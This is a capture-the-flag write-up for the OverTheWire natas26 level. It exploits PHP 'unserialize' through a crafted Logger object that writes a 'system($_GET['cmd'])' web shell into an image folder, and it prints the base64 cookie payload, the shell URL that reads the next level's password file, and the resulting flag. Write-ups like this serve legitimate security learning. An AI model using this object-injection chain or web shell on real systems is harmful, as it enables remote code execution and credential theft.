---
layout: default
title: natas26
---

Here we exploit the `unserialize` function, we manage to get RCE.

```php
<?php
class Logger{
        private $logFile;
        private $initMsg;
        private $exitMsg;

        function __construct($file){
            $this->initMsg="#--session started--#\n";
            $this->exitMsg="<?php system(\$_GET['cmd']); ?>";
            $this->logFile = "/var/www/natas/natas26/img/eli-copter-webshell.php";

        }

        function log($msg){
            $fd=fopen($this->logFile,"a+");
            fwrite($fd,$msg."\n");
            fclose($fd);
        }

        // That's what is really happening
        function __destruct(){
            // write exit message
            // $fd=fopen($this->logFile,"a+");
            // fwrite($fd,$this->exitMsg);
            // fclose($fd);
        }
    }
  
  $logger = [new Logger("")];
  echo base64_encode(serialize($logger));
?>
```

We inject the output of this program, which is:
```
YToxOntpOjA7Tzo2OiJMb2dnZXIiOjM6e3M6MTU6IgBMb2dnZXIAbG9nRmlsZSI7czo1MDoiL3Zhci93d3cvbmF0YXMvbmF0YXMyNi9pbWcvZWxpLWNvcHRlci13ZWJzaGVsbC5waHAiO3M6MTU6IgBMb2dnZXIAaW5pdE1zZyI7czoyMjoiIy0tc2Vzc2lvbiBzdGFydGVkLS0jCiI7czoxNToiAExvZ2dlcgBleGl0TXNnIjtzOjMwOiI8P3BocCBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgPz4iO319
``` 
into the cookie `drawing`. 
Then, when it get's unserialize, it executes the `__destrcut` function and writing our php code to the webshell file.

*Notice, our webshell will be in the /img folder, because we got access to the folder, and can write our own files there*

Then, after creating the webshell, we can echo the password. It doesn't work using `cat`, so i simply used `head`.
```
http://natas26.natas.labs.overthewire.org/img/eli-copter-webshell.php?cmd=head%20/etc/natas_webpass/natas27
```

**Flag:** ***`u3RRffXjysjgwFU6b9xa23i6prmUsYne`*** 